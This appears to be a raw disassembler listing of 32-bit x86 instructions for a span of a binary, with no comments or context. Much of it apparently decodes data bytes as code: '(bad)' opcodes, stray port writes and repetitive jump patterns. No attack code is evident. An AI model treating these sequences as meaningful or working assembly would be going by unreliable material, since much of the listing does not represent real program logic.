  43ac1c:	repz mov dl,0xdd
  43ac1f:	(bad)  
  43ac20:	call   0x43ae9b
  43ac25:	mov    bl,0xef
  43ac27:	idiv   bh
  43ac29:	xchg   edi,eax
  43ac2a:	out    0x3f,eax
  43ac2c:	add    BYTE PTR [ebx-0x19],ah
  43ac2f:	aas    
  43ac30:	add    BYTE PTR [ecx+eax*1],bl
  43ac33:	add    BYTE PTR [eax],al
  43ac35:	push   ebx
  43ac36:	out    dx,eax
  43ac37:	idiv   bh
  43ac39:	inc    edx
  43ac3a:	push   esi
  43ac3b:	cmp    eax,DWORD PTR [eax]
  43ac3d:	into   
  43ac3e:	push   ebp
  43ac3f:	cmp    eax,DWORD PTR [eax]
  43ac41:	sbb    al,0x1
  43ac43:	add    BYTE PTR [eax],al
  43ac45:	jae    0x43ac36
  43ac47:	idiv   bh
  43ac49:	xor    dh,bl
  43ac4b:	cmp    BYTE PTR [eax],al
  43ac4d:	mov    esp,0xdc0038dd
  43ac52:	add    BYTE PTR [eax],al
  43ac54:	add    bl,dl
  43ac56:	in     eax,dx
  43ac57:	idiv   bh
  43ac59:	lods   eax,DWORD PTR ds:[esi]
  43ac5a:	fstp   TBYTE PTR [eax]
  43ac5c:	add    BYTE PTR [ecx-0x23ffc725],ch
  43ac62:	add    BYTE PTR [eax],al
  43ac64:	add    ah,bl
  43ac66:	add    BYTE PTR [eax],al
  43ac68:	add    ah,cl
  43ac6a:	add    BYTE PTR [eax],al
  43ac6c:	add    BYTE PTR [ecx-0x7d],bl
  43ac6f:	in     al,dx
  43ac70:	daa    
  43ac71:	adc    eax,0x6a5248e4
  43ac76:	(bad)  
  43ac77:	jg     0x43ac89
  43ac79:	mov    WORD PTR [eax],es
  43ac7b:	pusha  
  43ac7c:	adc    DWORD PTR [eax],eax
  43ac7e:	add    BYTE PTR [eax],al
  43ac80:	add    BYTE PTR [eax],al
  43ac82:	mov    WORD PTR [eax],es
  43ac84:	pop    esp
  43ac85:	adc    DWORD PTR [eax+eax*1+0x9c1158],ebx
  43ac8c:	push   esp
  43ac8d:	adc    DWORD PTR [eax+eax*1+0x8c1164],ecx
  43ac94:	pushf  
  43ac95:	adc    DWORD PTR [eax+eax*1-0x78],ebx
  43ac99:	adc    DWORD PTR [eax+eax*1-0x7c],ebx
  43ac9d:	adc    DWORD PTR [eax+eax*1+0x40],ecx
  43aca1:	adc    DWORD PTR [ebp+0x29],esi
  43aca4:	std    
  43aca5:	cmp    esp,DWORD PTR [ecx+ebp*1-0x3]
  43aca9:	aaa    
  43acaa:	fs sub ebp,edi
  43acad:	xor    esp,DWORD PTR [ecx+ebp*1-0x3]
  43acb1:	inc    ebx
  43acb2:	fs sub ebp,edi
  43acb5:	jnp    0x43ac3b
  43acb7:	sub    ebp,edi
  43acb9:	test   BYTE PTR [bx+di],ch
  43acbc:	std    
  43acbd:	ss jg  0x43ace9
  43acc0:	std    
  43acc1:	pop    ds
  43acc2:	test   BYTE PTR [ecx],ch
  43acc4:	std    
  43acc5:	sbb    esp,DWORD PTR [ecx+ebp*1-0x3]
  43acc9:	pop    ss
  43acca:	fs sub ebp,edi
  43accd:	adc    esp,DWORD PTR [ecx+ebp*1-0x3]
  43acd1:	and    esp,DWORD PTR [ecx+ebp*1-0x3]
  43acd5:	pop    ebx
  43acd6:	test   BYTE PTR [ecx],ch
  43acd8:	std    
  43acd9:	inc    edi
  43acda:	test   BYTE PTR [ecx],ch
  43acdc:	std    
  43acdd:	inc    ebx
  43acde:	test   BYTE PTR [ecx],ch
  43ace0:	std    
  43ace1:	inc    DWORD PTR [ecx+ebp*1+0xfbfd]
  43ace8:	add    BYTE PTR [eax],al
  43acea:	add    BYTE PTR [ebp+0x29],ah
  43aced:	std    
  43acee:	mul    DWORD PTR [ebp+0x29]
  43acf1:	std    
  43acf2:	repz gs sub ebp,edi
  43acf6:	add    esp,DWORD PTR [ecx+ebp*1-0x3]
  43acfa:	cmp    eax,DWORD PTR [ecx+ebp*1+0x298427fd]
  43ad01:	std    
  43ad02:	and    eax,DWORD PTR [ecx+ebp*1+0x2985dffd]
  43ad09:	std    
  43ad0a:	(bad)  [ebp+0x29]
  43ad0d:	std    
  43ad0e:	xlat   BYTE PTR ds:[ebx]
  43ad0f:	gs sub ebp,edi
  43ad12:	shl    DWORD PTR [ebp+0x29],cl
  43ad15:	std    
  43ad16:	jecxz  0x43ad7d
  43ad18:	sub    ebp,edi
  43ad1a:	sbb    eax,DWORD PTR [ecx+ebp*1+0x284a1fd]
  43ad21:	out    0x3,eax
  43ad23:	jns    0x43ad16
  43ad25:	out    0x3,al
  43ad27:	xor    eax,0x1103e6f2
  43ad2c:	repnz out 0x3,al
  43ad2f:	or     eax,0x903e6f2
  43ad34:	repnz out 0x3,al
  43ad37:	xor    edx,esi
  43ad39:	out    0x3,al
  43ad3b:	xor    edx,esi
  43ad3d:	out    0x3,al
  43ad3f:	div    eax
  43ad41:	out    0x3,al
  43ad43:	sbb    edx,esi
  43ad45:	out    0x3,al
  43ad47:	aad    0xf1
  43ad49:	out    0x3,al
  43ad4b:	icebp  
  43ad4c:	icebp  
  43ad4d:	out    0x3,al
  43ad4f:	add    BYTE PTR [eax],al
  43ad51:	add    BYTE PTR [eax],al
  43ad53:	add    ch,ch
  43ad55:	icebp  
  43ad56:	out    0x3,al
  43ad58:	jmp    0xd147944e
  43ad5d:	icebp  
  43ad5e:	out    0x3,al
  43ad60:	shl    ecx,1
  43ad62:	out    0x3,al
  43ad64:	push   edi
  43ad65:	icebp  
  43ad66:	out    0x3,al
  43ad68:	mov    ecx,0xf503e6f1
  43ad6d:	icebp  
  43ad6e:	out    0x3,al
  43ad70:	push   ecx
  43ad71:	repnz out 0x3,al
  43ad74:	dec    ebp
  43ad75:	repnz out 0x3,al
  43ad78:	dec    ecx
  43ad79:	repnz out 0x3,al
  43ad7c:	icebp  
  43ad7d:	icebp  
  43ad7e:	out    0x3,al
  43ad80:	icebp  
  43ad81:	icebp  
  43ad82:	out    0x3,al
  43ad84:	aaa    
  43ad85:	icebp  
  43ad86:	out    0x3,al
  43ad88:	fyl2x  
  43ad8a:	out    0x3,al
  43ad8c:	test   ecx,esi
  43ad8e:	out    0x3,al
  43ad90:	xor    ecx,0xf17d03e6
  43ad96:	out    0x3,al
  43ad98:	jns    0x43ad8b
  43ad9a:	out    0x3,al
  43ad9c:	jne    0x43ad8f
  43ad9e:	(bad)  
  43ad9f:	call   0xe953c41a
  43ada4:	jbe    0x43adc0
  43ada6:	adc    cl,ch
  43ada8:	jbe    0x43adb8
  43adaa:	adc    cl,ch
  43adac:	jbe    0x43adec
  43adae:	adc    cl,ch
  43adb0:	jbe    0x43adf4
  43adb2:	adc    cl,ch
  43adb4:	jbe    0x43ae0c
  43adb6:	adc    cl,ch
  43adb8:	add    BYTE PTR [eax],al
  43adba:	add    BYTE PTR [eax],al
  43adbc:	add    BYTE PTR [esi+0x5a],dh
  43adbf:	adc    cl,ch
  43adc1:	jbe    0x43ae11
  43adc3:	adc    cl,ch
  43adc5:	jbe    0x43ae19
  43adc7:	adc    cl,ch
  43adc9:	jbe    0x43ae31
  43adcb:	adc    cl,ch
  43adcd:	jbe    0x43ae39
  43adcf:	adc    cl,ch
  43add1:	jbe    0x43ada5
  43add3:	psubsw mm6,QWORD PTR [esi-0x1a]
  43add7:	psubsw mm6,QWORD PTR [esi-0x16]
  43addb:	psubsw mm6,QWORD PTR [esi-0x22]
  43addf:	psubsw mm6,QWORD PTR [esi-0x1e]
  43ade3:	psubsw mm6,QWORD PTR [esi-0xa]
  43ade7:	psubsw mm6,QWORD PTR [esi-0x6]
  43adeb:	psubsw mm6,QWORD PTR [esi-0x12]
  43adef:	psubsw mm6,QWORD PTR [esi-0xe]
  43adf3:	psubsw mm6,QWORD PTR [esi+0x6]
  43adf7:	adc    cl,ch
  43adf9:	jbe    0x43ae05
  43adfb:	adc    cl,ch
  43adfd:	jbe    0x43adfd
  43adff:	psubsw mm6,QWORD PTR [esi+0x2]
  43ae03:	adc    cl,ch
  43ae05:	jbe    0x43ae1d
  43ae07:	or     ecx,ebp
  43ae09:	jbe    0x43ae25
  43ae0b:	or     ecx,ebp
  43ae0d:	jbe    0x43ae1d
  43ae0f:	or     ecx,ebp
  43ae11:	jbe    0x43ae25
  43ae13:	or     ecx,ebp
  43ae15:	jbe    0x43ae3d
  43ae17:	or     ecx,ebp
  43ae19:	jbe    0x43ae27
  43ae1b:	str    WORD PTR [ebp+eax*1+0xfd4]
  43ae23:	add    BYTE PTR [eax],al
  43ae25:	add    BYTE PTR [ebp+eax*1+0x55c10a6],cl
  43ae2c:	mov    ds:0xb7055c10,al
  43ae31:	pop    ss
  43ae32:	dec    esp
  43ae33:	add    eax,0x54c17ec
  43ae38:	stc    
  43ae39:	adc    DWORD PTR [ebp+eax*1-0x5c],ebx
  43ae3d:	adc    DWORD PTR [ebp+eax*1-0x34],ebx
  43ae41:	cmovl  eax,DWORD PTR ds:0x54c1027
  43ae48:	ror    BYTE PTR [edi],0x1c
  43ae4b:	add    eax,0x51c0fbc
  43ae50:	mov    eax,0xb4050c0f
  43ae55:	(bad)  
  43ae57:	add    eax,0x51c0fb4
  43ae5c:	mov    al,0xf
  43ae5e:	sbb    al,0x5
  43ae60:	lods   al,BYTE PTR ds:[esi]
  43ae61:	(bad)  
  43ae63:	add    eax,0x50c0fa8
  43ae68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ae69:	paddusb mm0,QWORD PTR [eax+eiz*4]
  43ae6d:	paddusb mm0,QWORD PTR [esp+ebx*4]
  43ae71:	bswap  esp
  43ae73:	add    al,0x98
  43ae75:	bswap  esp
  43ae77:	add    al,0x94
  43ae79:	paddusb mm0,QWORD PTR [eax+edx*4]
  43ae7d:	paddusb mm0,QWORD PTR [esp+ecx*4]
  43ae81:	bswap  esp
  43ae83:	add    al,0x88
  43ae85:	bswap  esp
  43ae87:	add    al,0x84
  43ae89:	sldt   WORD PTR [eax]
  43ae8c:	add    BYTE PTR [eax],al
  43ae8e:	add    BYTE PTR [esp+eax*1+0x49c0f80],bl
  43ae95:	jl     0x43aea6
  43ae97:	mov    WORD PTR [eax+edi*2],es
  43ae9a:	jl     0x755381a4
  43aea0:	sub    edi,ebp
  43aea2:	loope  0x43af08
  43aea4:	sub    edi,ebp
  43aea6:	retf   
  43aea7:	fs sub edi,ebp
  43aeaa:	enter  0x2b6a,0xfd
  43aeae:	dec    edi
  43aeaf:	sub    BYTE PTR [ecx],0xfd
  43aeb2:	dec    ebx
  43aeb3:	jp     0x43aede
  43aeb5:	std    
  43aeb6:	inc    edi
  43aeb7:	jb     0x43aee2
  43aeb9:	std    
  43aeba:	inc    ebx
  43aebb:	push   0x29
  43aebd:	std    
  43aebe:	aas    
  43aebf:	sub    BYTE PTR [ecx],0xfd
  43aec2:	cmp    edi,DWORD PTR [edx+0x29]
  43aec5:	std    
  43aec6:	aaa    
  43aec7:	jb     0x43aef2
  43aec9:	std    
  43aeca:	xor    ebp,DWORD PTR [edx+0x29]
  43aecd:	std    
  43aece:	das    
  43aecf:	sub    BYTE PTR [ecx],0xfd
  43aed2:	sub    edi,DWORD PTR [edx+0x29]
  43aed5:	std    
  43aed6:	daa    
  43aed7:	jb     0x43af02
  43aed9:	std    
  43aeda:	dec    ecx
  43aedb:	test   BYTE PTR [ecx],ch
  43aedd:	std    
  43aede:	das    
  43aedf:	sub    BYTE PTR [ecx],0xfd
  43aee2:	sub    edi,DWORD PTR [edx+0x29]
  43aee5:	std    
  43aee6:	daa    
  43aee7:	jb     0x43af12
  43aee9:	std    
  43aeea:	and    ebp,DWORD PTR [edx+0x29]
  43aeed:	std    
  43aeee:	pop    ds
  43aeef:	sub    BYTE PTR [ecx],0xfd
  43aef2:	sbb    eax,DWORD PTR [eax]
  43aef4:	add    BYTE PTR [eax],al
  43aef6:	add    BYTE PTR [eax],al
  43aef8:	jp     0x43af23
  43aefa:	std    
  43aefb:	pop    ss
  43aefc:	jb     0x43af27
  43aefe:	std    
  43aeff:	adc    ebp,DWORD PTR [edx+0x29]
  43af02:	std    
  43af03:	jb     0x7a4fac32
  43af09:	sub    ebp,edi
  43af0b:	mov    esp,0x3fd2965
  43af10:	push   0x29
  43af12:	std    
  43af13:	inc    DWORD PTR [edx+0x7bfbfd29]
  43af19:	sub    ebp,edi
  43af1b:	div    DWORD PTR [ebx+0x2]
  43af1e:	out    0x3,eax
  43af20:	mov    eax,ds:0x3903e708
  43af25:	repnz out 0x3,al
  43af28:	and    eax,0x4103e6f2
  43af2d:	repnz out 0x3,al
  43af30:	sub    eax,0x5503e6f2
  43af35:	or     bh,ah
  43af37:	add    ecx,DWORD PTR [ecx+0x8]
  43af3a:	out    0x3,eax
  43af3c:	cmp    eax,0x4103e708
  43af41:	or     bh,ah
  43af43:	add    ebp,DWORD PTR [ecx]
  43af45:	or     bh,ah
  43af47:	add    edi,DWORD PTR [ecx+0x7]
  43af4a:	out    0x3,eax
  43af4c:	sub    eax,0x3103e708
  43af51:	or     bh,ah
  43af53:	add    esi,DWORD PTR ds:0xe903e708
  43af59:	pop    es
  43af5a:	out    0x3,eax
  43af5c:	add    BYTE PTR [eax],al
  43af5e:	add    BYTE PTR [eax],al
  43af60:	add    ch,bl
  43af62:	pop    es
  43af63:	out    0x3,eax
  43af65:	loope  0x43af6e
  43af67:	out    0x3,eax
  43af69:	leave  
  43af6a:	pop    es
  43af6b:	out    0x3,eax
  43af6d:	lds    eax,FWORD PTR [edi]
  43af6f:	out    0x3,eax
  43af71:	rol    DWORD PTR [edi],1
  43af73:	out    0x3,eax
  43af75:	int    0x7
  43af77:	out    0x3,eax
  43af79:	sbb    DWORD PTR [eax],ecx
  43af7b:	out    0x3,eax
  43af7d:	adc    eax,0x103e708
  43af82:	or     bh,ah
  43af84:	add    edi,ebp
  43af86:	pop    es
  43af87:	out    0x3,eax
  43af89:	aad    0x7
  43af8b:	out    0x3,eax
  43af8d:	test   eax,0x9d03e707
  43af92:	pop    es
  43af93:	out    0x3,eax
  43af95:	mov    eax,ds:0xc503e707
  43af9a:	pop    es
  43af9b:	add    cl,ch
  43af9d:	jbe    0x43afe5
  43af9f:	or     ch,cl
  43afa1:	jbe    0x43afed
  43afa3:	or     ch,cl
  43afa5:	jbe    0x43afe5
  43afa7:	or     ch,cl
  43afa9:	jbe    0x43afd8
  43afab:	or     ch,cl
  43afad:	jbe    0x43afe0
  43afaf:	or     ch,cl
  43afb1:	jbe    0x43b004
  43afb3:	or     ecx,ebp
  43afb5:	jbe    0x43af55
  43afb7:	or     ecx,ebp
  43afb9:	jbe    0x43af3b
  43afbb:	or     ecx,ebp
  43afbd:	jbe    0x43af53
  43afbf:	or     cl,ch
  43afc1:	jbe    0x43b01a
  43afc3:	or     ch,cl
  43afc5:	add    BYTE PTR [eax],al
  43afc7:	add    BYTE PTR [eax],al
  43afc9:	add    BYTE PTR [esi-0x3f],dh
  43afcc:	or     cl,ch
  43afce:	jbe    0x43af76
  43afd0:	or     cl,ch
  43afd2:	jbe    0x43af9a
  43afd4:	or     ecx,ebp
  43afd6:	jbe    0x43b04b
  43afd8:	or     ecx,ebp
  43afda:	jbe    0x43af9a
  43afdc:	or     ecx,ebp
  43afde:	jbe    0x43afa2
  43afe0:	or     ecx,ebp
  43afe2:	jbe    0x43afa6
  43afe4:	or     ecx,ebp
  43afe6:	jbe    0x43af92
  43afe8:	or     ecx,ebp
  43afea:	jbe    0x43afba
  43afec:	or     ecx,ebp
  43afee:	jbe    0x43afd2
  43aff0:	or     ecx,ebp
  43aff2:	jbe    0x43afea
  43aff4:	or     ecx,ebp
  43aff6:	jbe    0x43aff2
  43aff8:	or     ecx,ebp
  43affa:	jbe    0x43afea
  43affc:	or     ecx,ebp
  43affe:	jbe    0x43afdf
  43b000:	or     cl,ch
  43b002:	jbe    0x43afe7
  43b004:	or     cl,ch
  43b006:	jbe    0x43b002
  43b008:	or     ecx,ebp
  43b00a:	jbe    0x43affa
  43b00c:	or     ecx,ebp
  43b00e:	jbe    0x43b08c
  43b010:	adc    ecx,ebp
  43b012:	jbe    0x43b06a
  43b014:	adc    ecx,ebp
  43b016:	jbe    0x43afdd
  43b018:	pop    ss
  43b019:	add    ah,cl
  43b01b:	add    DWORD PTR [edi+0x22019c18],esp
  43b021:	sbb    DWORD PTR [ecx+eax*1+0x18c1978],ebx
  43b028:	(bad)  
  43b029:	sbb    DWORD PTR [ecx+eax*1+0x1a29],ecx
  43b030:	add    BYTE PTR [eax],al
  43b032:	add    BYTE PTR [ecx+eax*1+0x19c0df4],bl
  43b039:	lock or eax,0xdec018c
  43b03f:	mov    WORD PTR [ecx],es
  43b041:	call   0xe4450c53
  43b046:	or     eax,0xde0015c
  43b04b:	dec    esp
  43b04c:	add    esp,ebx
  43b04e:	or     eax,0xdd8014c
  43b053:	pop    esp
  43b054:	add    DWORD PTR [eax],edx
  43b056:	push   cs
  43b057:	pop    esp
  43b058:	add    DWORD PTR [esi+ecx*1],ecx
  43b05b:	dec    esp
  43b05c:	add    DWORD PTR [esi-0x37feb3f1],edi
  43b062:	or     eax,0xdc0011c
  43b067:	sbb    al,0x1
  43b069:	mov    esp,0xb8010c0d
  43b06e:	or     eax,0xdb4010c
  43b073:	sbb    al,0x1
  43b075:	jbe    0x43b085
  43b077:	sbb    al,0x1
  43b079:	lods   al,BYTE PTR ds:[esi]
  43b07a:	or     eax,0x15eb010c
  43b07f:	or     al,0x1
  43b081:	cs push ss
  43b083:	fadd   QWORD PTR [eax]
  43b085:	mov    al,ds:0x9c00dc0d
  43b08a:	or     eax,0x102c00cc
  43b08f:	int3   
  43b090:	add    BYTE PTR [edx+0x10],dl
  43b093:	fadd   QWORD PTR [eax]
  43b095:	nop
  43b096:	or     eax,0x0
  43b09b:	add    BYTE PTR [ebp+0x2b],dh
  43b09e:	std    
  43b09f:	mov    esi,DWORD PTR [eax+0x2b]
  43b0a2:	std    
  43b0a3:	xchg   DWORD PTR [eax+0x2b],ebp
  43b0a6:	std    
  43b0a7:	add    DWORD PTR [eax+0x787ffd2b],0x2b
  43b0ae:	std    
  43b0af:	jnp    0x43b121
  43b0b1:	sub    edi,ebp
  43b0b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b0b4:	test   DWORD PTR [ebx],ebp
  43b0b6:	std    
  43b0b7:	ret    0x2b65
  43b0ba:	std    
  43b0bb:	frstor [ebp+0x2b]
  43b0be:	std    
  43b0bf:	clc    
  43b0c0:	gs sub edi,ebp
  43b0c3:	push   edi
  43b0c4:	push   0x8053fd2b
  43b0c9:	sub    ebp,edi
  43b0cb:	mov    ecx,0x5bfd297a
  43b0d0:	jo     0x43b0fb
  43b0d2:	std    
  43b0d3:	push   edi
  43b0d4:	push   0x8053fd29
  43b0d9:	sub    ebp,edi
  43b0db:	dec    edi
  43b0dc:	js     0x43b107
  43b0de:	std    
  43b0df:	dec    ebx
  43b0e0:	jo     0x43b10b
  43b0e2:	std    
  43b0e3:	mov    eax,ds:0x43fd296a
  43b0e8:	sub    BYTE PTR [ecx],0xfd
  43b0eb:	cdq    
  43b0ec:	jp     0x43b117
  43b0ee:	std    
  43b0ef:	sub    esi,DWORD PTR [eax+0x29]
  43b0f2:	std    
  43b0f3:	aaa    
  43b0f4:	push   0x828dfd29
  43b0f9:	sub    ebp,edi
  43b0fb:	pop    ds
  43b0fc:	js     0x43b127
  43b0fe:	std    
  43b0ff:	sbb    eax,DWORD PTR [eax]
  43b101:	add    BYTE PTR [eax],al
  43b103:	add    BYTE PTR [eax],al
  43b105:	jo     0x43b130
  43b107:	std    
  43b108:	pop    ss
  43b109:	push   0x8013fd29
  43b10e:	sub    ebp,edi
  43b110:	vmread DWORD PTR [ecx],ebp
  43b113:	std    
  43b114:	or     esi,DWORD PTR [eax+0x29]
  43b117:	std    
  43b118:	pop    es
  43b119:	push   0x7903e702
  43b11e:	add    eax,0xeef603e7
  43b123:	out    0x3,al
  43b125:	rol    DWORD PTR [esi],0xe7
  43b128:	add    edi,DWORD PTR [ebp-0x56fc18fa]
  43b12e:	push   es
  43b12f:	out    0x3,eax
  43b131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b132:	push   es
  43b133:	out    0x3,eax
  43b135:	xchg   ecx,eax
  43b136:	push   es
  43b137:	out    0x3,eax
  43b139:	lea    eax,[esi]
  43b13b:	out    0x3,eax
  43b13d:	cdq    
  43b13e:	push   es
  43b13f:	out    0x3,eax
  43b141:	pop    ebp
  43b142:	add    al,0xe7
  43b144:	add    ebx,DWORD PTR [ecx+0x4]
  43b147:	out    0x3,eax
  43b149:	push   ebp
  43b14a:	add    al,0xe7
  43b14c:	add    edx,DWORD PTR [ecx-0x50fc18fc]
  43b152:	add    esp,edi
  43b154:	add    ebp,DWORD PTR [ebx-0x58fc18fd]
  43b15a:	add    esp,edi
  43b15c:	add    esp,DWORD PTR [ebx+0x3503e703]
  43b162:	push   es
  43b163:	out    0x3,eax
  43b165:	add    DWORD PTR [esi],eax
  43b167:	out    0x3,eax
  43b169:	add    BYTE PTR [eax],al
  43b16b:	add    BYTE PTR [eax],al
  43b16d:	add    ch,bh
  43b16f:	add    eax,0x5e903e7
  43b174:	out    0x3,eax
  43b176:	in     eax,0x5
  43b178:	out    0x3,eax
  43b17a:	rol    DWORD PTR ds:0x5cd03e7,1
  43b180:	out    0x3,eax
  43b182:	fld    DWORD PTR ds:0x5c503e7
  43b188:	out    0x3,eax
  43b18a:	rol    DWORD PTR ds:0x5cd03e7,1
  43b190:	out    0x3,eax
  43b192:	sbb    DWORD PTR [esi],eax
  43b194:	out    0x3,eax
  43b196:	adc    eax,0x76e90006
  43b19b:	jbe    0x43b1a9
  43b19d:	jmp    0xe94dc218
  43b1a2:	jbe    0x43b1c8
  43b1a4:	or     ch,cl
  43b1a6:	jbe    0x43b1fe
  43b1a8:	adc    ebp,ecx
  43b1aa:	jbe    0x43b1c8
  43b1ac:	or     ch,cl
  43b1ae:	jbe    0x43b1dd
  43b1b0:	adc    ebp,ecx
  43b1b2:	jbe    0x43b1e8
  43b1b4:	or     ch,cl
  43b1b6:	jbe    0x43b1f0
  43b1b8:	or     ch,cl
  43b1ba:	jbe    0x43b1e8
  43b1bc:	or     ch,cl
  43b1be:	jbe    0x43b1f0
  43b1c0:	or     ch,cl
  43b1c2:	jbe    0x43b208
  43b1c4:	or     ch,cl
  43b1c6:	jbe    0x43b16a
  43b1c8:	or     ebp,ecx
  43b1ca:	jbe    0x43b182
  43b1cc:	or     ebp,ecx
  43b1ce:	jbe    0x43b18a
  43b1d0:	or     ebp,ecx
  43b1d2:	add    BYTE PTR [eax],al
  43b1d4:	add    BYTE PTR [eax],al
  43b1d6:	add    BYTE PTR [esi-0x4a],dh
  43b1d9:	or     ebp,ecx
  43b1db:	jbe    0x43b18f
  43b1dd:	or     ebp,ecx
  43b1df:	jbe    0x43b19f
  43b1e1:	or     ebp,ecx
  43b1e3:	jbe    0x43b19f
  43b1e5:	or     ebp,ecx
  43b1e7:	jbe    0x43b1af
  43b1e9:	or     ebp,ecx
  43b1eb:	jbe    0x43b1af
  43b1ed:	or     ebp,ecx
  43b1ef:	jbe    0x43b1bf
  43b1f1:	or     ebp,ecx
  43b1f3:	jbe    0x43b1bf
  43b1f5:	or     ebp,ecx
  43b1f7:	jbe    0x43b1cf
  43b1f9:	or     ebp,ecx
  43b1fb:	jbe    0x43b1cf
  43b1fd:	or     ebp,ecx
  43b1ff:	jbe    0x43b1df
  43b201:	or     ebp,ecx
  43b203:	jbe    0x43b1df
  43b205:	or     ebp,ecx
  43b207:	jbe    0x43b1ef
  43b209:	or     ebp,ecx
  43b20b:	jbe    0x43b1ef
  43b20d:	or     ebp,ecx
  43b20f:	jbe    0x43b1ff
  43b211:	or     ebp,ecx
  43b213:	jbe    0x43b1ff
  43b215:	or     eax,DWORD PTR [eax]
  43b217:	fadd   QWORD PTR ds:0x5dc0c14
  43b21d:	adc    BYTE PTR [esp+ecx*8],cl
  43b220:	add    eax,0x5cc0c0c
  43b225:	or     BYTE PTR [esp+ebx*8],cl
  43b228:	add    eax,0x5dc0c04
  43b22d:	add    BYTE PTR [esp+ecx*8],cl
  43b230:	add    eax,0x5cc0bfc
  43b235:	clc    
  43b236:	or     ebx,DWORD PTR [ebp+eax*1+0xbf4]
  43b23d:	add    BYTE PTR [eax],al
  43b23f:	add    BYTE PTR [ebp+eax*1+0x58c0bf0],bl
  43b246:	in     al,dx
  43b247:	or     ecx,DWORD PTR [ebp+eax*1+0x59c0be8]
  43b24e:	in     al,0xb
  43b250:	pushf  
  43b251:	add    eax,0x58c0be0
  43b256:	fmul   QWORD PTR [ebx]
  43b258:	mov    WORD PTR ds:0x55c0bd8,es
  43b25e:	aam    0xb
  43b260:	pop    esp
  43b261:	add    eax,0x54c0bd0
  43b266:	int3   
  43b267:	or     ecx,DWORD PTR [ebp+eax*1-0x38]
  43b26b:	or     ebx,DWORD PTR [ebp+eax*1-0x3c]
  43b26f:	or     ebx,DWORD PTR [ebp+eax*1-0x40]
  43b273:	or     ecx,DWORD PTR [ebp+eax*1-0x44]
  43b277:	or     ecx,DWORD PTR [ebp+eax*1-0x48]
  43b27b:	or     ebx,DWORD PTR [eax*1+0x51c0bb4]
  43b282:	ror    DWORD PTR [ebx],0xc
  43b285:	add    eax,0x50c0bbd
  43b28a:	test   al,0xb
  43b28c:	sbb    al,0x5
  43b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b28f:	or     ebx,DWORD PTR [eax*1+0x1b750ba0]
  43b296:	std    
  43b297:	mov    DWORD PTR [ebp+0x1b],esp
  43b29a:	std    
  43b29b:	adc    al,BYTE PTR [ebx+ebx*1+0x1b849bfd]
  43b2a2:	std    
  43b2a3:	pop    DWORD PTR [eax]
  43b2a5:	add    BYTE PTR [eax],al
  43b2a7:	add    BYTE PTR [eax],al
  43b2a9:	outs   dx,BYTE PTR ds:[esi]
  43b2aa:	sbb    edi,ebp
  43b2ac:	mov    ebp,DWORD PTR [esi+0x1b]
  43b2af:	std    
  43b2b0:	xchg   DWORD PTR [esi+0x1b],edi
  43b2b3:	std    
  43b2b4:	xchg   ebx,eax
  43b2b5:	jle    0x43b2d2
  43b2b7:	std    
  43b2b8:	jg     0x43b328
  43b2ba:	sbb    edi,ebp
  43b2bc:	jnp    0x43b32c
  43b2be:	sbb    edi,ebp
  43b2c0:	loope  0x43b242
  43b2c2:	sbb    edi,ebp
  43b2c4:	fnstsw WORD PTR [eax+0x1b]
  43b2c7:	std    
  43b2c8:	outs   dx,DWORD PTR ds:[esi]
  43b2c9:	outs   dx,BYTE PTR ds:[esi]
  43b2ca:	sbb    edi,ebp
  43b2cc:	imul   ebp,DWORD PTR [esi+0x1b],0xfffffffd
  43b2d0:	addr16 jle 0x43b2ee
  43b2d3:	std    
  43b2d4:	arpl   WORD PTR [esi+0x1b],di
  43b2d7:	std    
  43b2d8:	scas   eax,DWORD PTR es:[edi]
  43b2d9:	outs   dx,BYTE PTR ds:[esi]
  43b2da:	sbb    edi,ebp
  43b2dc:	stos   DWORD PTR es:[edi],eax
  43b2dd:	outs   dx,BYTE PTR ds:[esi]
  43b2de:	sbb    edi,ebp
  43b2e0:	xchg   BYTE PTR [ecx+0x7982fd19],al
  43b2e6:	sbb    ebp,edi
  43b2e8:	jle    0x43b35b
  43b2ea:	sbb    ebp,edi
  43b2ec:	jp     0x43b357
  43b2ee:	sbb    ebp,edi
  43b2f0:	xchg   edi,eax
  43b2f1:	jle    0x43b30c
  43b2f3:	std    
  43b2f4:	xchg   ebx,eax
  43b2f5:	jle    0x43b310
  43b2f7:	std    
  43b2f8:	(bad)  
  43b2f9:	outs   dx,BYTE PTR ds:[esi]
  43b2fa:	sbb    ebp,edi
  43b2fc:	mov    ebp,DWORD PTR [esi+0x19]
  43b2ff:	std    
  43b300:	xchg   DWORD PTR [esi+0x19],edi
  43b303:	std    
  43b304:	cmp    DWORD PTR [esi+0x19],0xfffffffd
  43b308:	jg     0x43b378
  43b30a:	sbb    ebp,edi
  43b30c:	jnp    0x43b30e
  43b30e:	add    BYTE PTR [eax],al
  43b310:	add    BYTE PTR [eax],al
  43b312:	outs   dx,BYTE PTR ds:[esi]
  43b313:	sbb    ebp,edi
  43b315:	ja     0x43b395
  43b317:	add    ah,bh
  43b319:	add    eax,DWORD PTR [ecx+0x5503e6fb]
  43b31f:	sti    
  43b320:	out    0x3,al
  43b322:	pop    ecx
  43b323:	sti    
  43b324:	out    0x3,al
  43b326:	(bad)  
  43b327:	sti    
  43b328:	out    0x3,al
  43b32a:	cmp    ebx,0xfb8503e6
  43b330:	out    0x3,al
  43b332:	imul   edi,ebx,0xfb7d03e6
  43b338:	out    0x3,al
  43b33a:	jno    0x43b337
  43b33c:	out    0x3,al
  43b33e:	jne    0x43b33b
  43b340:	out    0x3,al
  43b342:	mov    ecx,0xad03e6fc
  43b347:	cld    
  43b348:	out    0x3,al
  43b34a:	mov    eax,ds:0xa503e6fc
  43b34f:	cld    
  43b350:	out    0x3,al
  43b352:	mov    esp,edi
  43b354:	out    0x3,al
  43b356:	popf   
  43b357:	cld    
  43b358:	out    0x3,al
  43b35a:	xchg   ecx,eax
  43b35b:	cld    
  43b35c:	out    0x3,al
  43b35e:	test   esp,edi
  43b360:	out    0x3,al
  43b362:	mov    esp,edi
  43b364:	out    0x3,al
  43b366:	pop    ebp
  43b367:	cld    
  43b368:	out    0x3,al
  43b36a:	inc    ecx
  43b36b:	cld    
  43b36c:	out    0x3,al
  43b36e:	mov    eax,0x2903e6fb
  43b373:	cld    
  43b374:	out    0x3,al
  43b376:	add    BYTE PTR [eax],al
  43b378:	add    BYTE PTR [eax],al
